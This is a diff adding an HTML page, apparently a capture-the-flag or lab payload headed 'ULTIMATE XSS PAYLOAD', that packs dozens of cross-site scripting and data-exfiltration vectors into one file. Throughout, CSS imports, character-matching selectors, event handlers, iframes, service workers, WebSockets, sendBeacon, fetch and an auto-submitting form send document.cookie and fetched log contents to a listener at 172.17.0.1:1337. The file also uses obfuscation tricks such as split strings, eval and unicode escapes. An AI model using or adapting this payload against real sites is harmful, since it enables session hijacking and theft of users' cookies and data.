@@ -1,0 +1,292 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Hypocrite</title>
+    <style>
+    @import url('http://172.17.0.1:1337/css1?t=css_import');
+    @import url('//172.17.0.1:1337/css2?t=no_proto');
+    body { 
+        background-image: 
+            url('http://172.17.0.1:1337/bg1'),
+            url('http://172.17.0.1:1337/bg2'),
+            url('http://172.17.0.1:1337/bg3');
+    }
+    input[value*="f"] { background: url('http://172.17.0.1:1337/char_f'); }
+    input[value*="l"] { background: url('http://172.17.0.1:1337/char_l'); }
+    input[value*="a"] { background: url('http://172.17.0.1:1337/char_a'); }
+    input[value*="g"] { background: url('http://172.17.0.1:1337/char_g'); }
+    @font-face {
+        font-family: 'EvilFont';
+        src: url('http://172.17.0.1:1337/font?t=font_face');
+    }
+    * { cursor: url('http://172.17.0.1:1337/cursor?t=cursor'), auto; }
+    </style>
+    
+    <link rel="stylesheet" href="http://172.17.0.1:1337/link_css">
+    <link rel="preload" href="http://172.17.0.1:1337/preload_script" as="script">
+    <link rel="preload" href="http://172.17.0.1:1337/preload_font" as="font" crossorigin>
+    <link rel="icon" href="http://172.17.0.1:1337/favicon?t=icon">
+    <link rel="manifest" href="http://172.17.0.1:1337/manifest">
+    <link rel="dns-prefetch" href="//172.17.0.1:1337/dns">
+    <link rel="preconnect" href="http://172.17.0.1:1337">
+    <link rel="prerender" href="http://172.17.0.1:1337/prerender">
+    
+    <meta http-equiv="refresh" content="0;url=http://172.17.0.1:1337/refresh?t=meta_refresh">
+    <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-inline' 'unsafe-eval' http://172.17.0.1:1337/">
+    <meta property="og:image" content="http://172.17.0.1:1337/og_image">
+    
+    <script>
+    var cookie = document.cookie;
+    new Image().src = 'http://172.17.0.1:1337/script1?c=' + cookie;
+    window['al' + 'ert']('Test1');
+    document['createElement']('img')['src'] = 'http://172.17.0.1:1337/script2';
+    eval("new Image().src='http://172.17.0.1:1337/eval1'");
+    Function("new Image().src='http://172.17.0.1:1337/func_cons'")();
+    setTimeout("new Image().src='http://172.17.0.1:1337/timeout'", 100);
+    setInterval("new Image().src='http://172.17.0.1:1337/interval'", 1000);
+    with(document) {
+        createElement('img').src = 'http://172.17.0.1:1337/with_stmt';
+    }
+    location = 'javascript:new Image().src="http://172.17.0.1:1337/location_js"';
+    location.href = 'javascript:new Image().src="http://172.17.0.1:1337/location_href"';
+    location.assign('javascript:new Image().src="http://172.17.0.1:1337/location_assign"');
+    ';window['ale'+'rt'](window['doc'+'ument']['dom'+'ain']);//
+    ';window['ale'+'rt'](document['coo'+'kie']);//
+    \u006e\u0065\u0077 \u0049\u006d\u0061\u0067\u0065().src='http://172.17.0.1:1337/unicode';
+    </script>
+    
+    <script>
+    document.write('<img src=x onerror="new Image().src=\'http://172.17.0.1:1337/onerror1\'">');
+    document.write("<script>new Image().src='http://172.17.0.1:1337/doc_write'<\/script>");
+    </script>
+</head>
+<body onload="new Image().src='http://172.17.0.1:1337/body_onload'" 
+      onunload="new Image().src='http://172.17.0.1:1337/body_onunload'"
+      onfocus="new Image().src='http://172.17.0.1:1337/body_onfocus'"
+      onbeforeunload="new Image().src='http://172.17.0.1:1337/body_beforeunload'">
+    
+    <img src="http://172.17.0.1:1337/img1" width="0" height="0">
+    <img src="//172.17.0.1:1337/img2" width="0" height="0">
+    <img src="/img3" width="0" height="0" onerror="new Image().src='http://172.17.0.1:1337/img_onerror'">
+    
+    <img src="http://172.17.0.1:1337/src1" 
+         srcset="http://172.17.0.1:1337/srcset1 1x, http://172.17.0.1:1337/srcset2 2x"
+         width="0" height="0">
+    
+    <picture>
+        <source media="(min-width: 800px)" srcset="http://172.17.0.1:1337/pic_large">
+        <source srcset="http://172.17.0.1:1337/pic_small">
+        <img src="http://172.17.0.1:1337/pic_fallback" width="0" height="0">
+    </picture>
+    
+    <iframe src="http://172.17.0.1:1337/iframe1" width="0" height="0"></iframe>
+    <iframe src="//172.17.0.1:1337/iframe2" width="0" height="0"></iframe>
+    <iframe src="/iframe3" width="0" height="0"></iframe>
+    
+    <iframe src="javascript:new Image().src='http://172.17.0.1:1337/iframe_js'" width="0" height="0"></iframe>
+    <iframe src="javascript:document.write('<img src=\"http://172.17.0.1:1337/iframe_docwrite\">')" width="0" height="0"></iframe>
+    <iframe src="javascript:top.location='http://172.17.0.1:1337/iframe_top'" width="0" height="0"></iframe>
+    
+    <iframe srcdoc="<script>new Image().src='http://172.17.0.1:1337/srcdoc'</script>" width="0" height="0"></iframe>
+    <iframe srcdoc="<img src=x onerror=&quot;new Image().src='http://172.17.0.1:1337/srcdoc_onerror'&quot;>" width="0" height="0"></iframe>
+    
+    <embed src="http://172.17.0.1:1337/embed1" width="0" height="0">
+    <embed src="//172.17.0.1:1337/embed2" width="0" height="0">
+    
+    <object data="http://172.17.0.1:1337/object1" width="0" height="0"></object>
+    <object data="//172.17.0.1:1337/object2" width="0" height="0"></object>
+    
+    <object width="0" height="0">
+        <param name="movie" value="http://172.17.0.1:1337/object_param">
+        <embed src="http://172.17.0.1:1337/object_embed" width="0" height="0">
+    </object>
+    
+    <audio src="http://172.17.0.1:1337/audio1" controls></audio>
+    <video src="http://172.17.0.1:1337/video1" controls width="0" height="0"></video>
+    
+    <video controls width="0" height="0">
+        <source src="http://172.17.0.1:1337/video_src1" type="video/mp4">
+        <source src="http://172.17.0.1:1337/video_src2" type="video/webm">
+    </video>
+    
+    <video width="0" height="0">
+        <track src="http://172.17.0.1:1337/track" kind="subtitles" srclang="en" label="English">
+    </video>
+    
+    <form action="http://172.17.0.1:1337/form_action" method="POST" id="form1">
+        <input type="hidden" name="cookie" value="">
+        <input type="submit" value="Submit">
+    </form>
+    
+    <form action="//172.17.0.1:1337/form_no_proto" method="GET">
+        <input type="text" name="data" value="">
+    </form>
+    
+    <form>
+        <button formaction="http://172.17.0.1:1337/button_action">Click</button>
+    </form>
+    
+    <input type="submit" formaction="http://172.17.0.1:1337/input_action" value="Submit2">
+    
+    <a href="http://172.17.0.1:1337/a_href">Link</a>
+    <a href="//172.17.0.1:1337/a_no_proto">Link2</a>
+    <a href="javascript:new Image().src='http://172.17.0.1:1337/a_js'">JS Link</a>
+    
+    <a href="http://172.17.0.1:1337/a_dest" ping="http://172.17.0.1:1337/a_ping">Ping Link</a>
+    
+    <map name="testmap">
+        <area shape="rect" coords="0,0,10,10" href="http://172.17.0.1:1337/area1" alt="Area1">
+        <area shape="circle" coords="20,20,10" href="javascript:new Image().src='http://172.17.0.1:1337/area_js'" alt="Area2">
+    </map>
+    <img src="http://172.17.0.1:1337/map_img" usemap="#testmap" width="50" height="50">
+    
+    <svg width="0" height="0">
+        <script>new Image().src='http://172.17.0.1:1337/svg_script'</script>
+        <image href="http://172.17.0.1:1337/svg_image" width="0" height="0"/>
+        <a href="http://172.17.0.1:1337/svg_a">
+            <text x="0" y="0">SVG Link</text>
+        </a>
+        <a href="javascript:new Image().src='http://172.17.0.1:1337/svg_a_js'">
+            <rect width="10" height="10"/>
+        </a>
+        <rect width="10" height="10" onload="new Image().src='http://172.17.0.1:1337/svg_onload'"/>
+        <foreignObject width="100" height="100">
+            <body xmlns="http://www.w3.org/1999/xhtml">
+                <script>new Image().src='http://172.17.0.1:1337/svg_foreign'</script>
+                <img src="http://172.17.0.1:1337/svg_foreign_img" onerror="new Image().src='http://172.17.0.1:1337/svg_foreign_error'"/>
+            </body>
+        </foreignObject>
+    </svg>
+    
+    <math>
+        <mtext>
+            <table>
+                <mglyph>
+                    <style>
+                    @import url('http://172.17.0.1:1337/mathml_css');
+                    </style>
+                    <img src=x onerror="new Image().src='http://172.17.0.1:1337/mathml_onerror'" width="0" height="0">
+                </mglyph>
+            </table>
+        </mtext>
+    </math>
+    
+    <details ontoggle="new Image().src='http://172.17.0.1:1337/details_toggle'" open>
+        <summary>Click me</summary>
+        Content
+    </details>
+    
+    <dialog open onclick="new Image().src='http://172.17.0.1:1337/dialog_click'">
+        Dialog
+    </dialog>
+    
+    <input type="text" 
+           onfocus="new Image().src='http://172.17.0.1:1337/input_focus'"
+           onblur="new Image().src='http://172.17.0.1:1337/input_blur'"
+           onchange="new Image().src='http://172.17.0.1:1337/input_change'"
+           autofocus>
+    
+    <select onchange="new Image().src='http://172.17.0.1:1337/select_change'">
+        <option value="1">Option 1</option>
+        <option value="2">Option 2</option>
+    </select>
+    
+    <progress value="50" max="100" onload="new Image().src='http://172.17.0.1:1337/progress_load'"></progress>
+    
+    <template>
+        <script>new Image().src='http://172.17.0.1:1337/template'</script>
+    </template>
+    
+    <script>
+    try {
+        customElements.define('xss-element', class extends HTMLElement {
+            connectedCallback() {
+                new Image().src='http://172.17.0.1:1337/custom_element';
+            }
+        });
+        document.createElement('xss-element');
+    } catch(e) {}
+    </script>
+    
+    <script>
+    const div = document.createElement('div');
+    const shadow = div.attachShadow({mode: 'open'});
+    shadow.innerHTML = '<script>new Image().src="http://172.17.0.1:1337/shadow_dom"</script>';
+    document.body.appendChild(div);
+    </script>
+    
+    <script>
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('http://172.17.0.1:1337/sw.js')
+            .then(() => new Image().src='http://172.17.0.1:1337/sw_registered')
+            .catch(() => new Image().src='http://172.17.0.1:1337/sw_failed');
+    }
+    </script>
+    
+    <script>
+    try {
+        const ws = new WebSocket('ws://172.17.0.1:1337/ws');
+        ws.onopen = () => new Image().src='http://172.17.0.1:1337/ws_open';
+        ws.onerror = () => new Image().src='http://172.17.0.1:1337/ws_error';
+    } catch(e) {}
+    </script>
+    
+    <script>
+    navigator.sendBeacon('http://172.17.0.1:1337/beacon', document.cookie);
+    </script>
+    
+    <script>
+    fetch('http://172.17.0.1:1337/fetch_get')
+        .then(() => new Image().src='http://172.17.0.1:1337/fetch_success')
+        .catch(() => new Image().src='http://172.17.0.1:1337/fetch_error');
+    fetch('http://172.17.0.1:1337/fetch_post', {
+        method: 'POST',
+        body: 'cookie=' + document.cookie
+    });
+    </script>
+    
+    <script>
+    const xhr = new XMLHttpRequest();
+    xhr.open('GET', 'http://172.17.0.1:1337/xhr');
+    xhr.send();
+    </script>
+    
+    <script type="module">
+    import('http://172.17.0.1:1337/module.js')
+        .then(() => new Image().src='http://172.17.0.1:1337/module_loaded')
+        .catch(() => new Image().src='http://172.17.0.1:1337/module_failed');
+    </script>
+    
+    <script>
+    new Worker('http://172.17.0.1:1337/worker.js');
+    new SharedWorker('http://172.17.0.1:1337/shared_worker.js');
+    </script>
+    
+    <div data-url="http://172.17.0.1:1337/data_attr"></div>
+    
+    <base href="http://172.17.0.1:1337/base/">
+    
+    <input type="hidden" id="cookieInput" name="cookieInput">
+    
+    <h1>ULTIMATE XSS PAYLOAD</h1>
+    <p>Testing all techniques...</p>
+    
+    <form id="autoForm" action="http://172.17.0.1:1337/auto_submit" method="POST" style="display:none;">
+        <input type="hidden" name="cookie" id="cookieField">
+    </form>
+    
+    <script>
+    try {
+        document.getElementById('cookieField').value = document.cookie;
+        document.getElementById('autoForm').submit();
+        window.onload = function() {
+            new Image().src = 'http://172.17.0.1:1337/final?c=' + encodeURIComponent(document.cookie);
+            fetch('http://172.17.0.1:1337/logs')
+                .then(r => r.text())
+                .then(t => new Image().src = 'http://172.17.0.1:1337/logs_result?data=' + encodeURIComponent(t.substring(0, 100)))
+                .catch(e => {});
+        };
+    } catch(e) {}
+    </script>
+</body>
+</html>
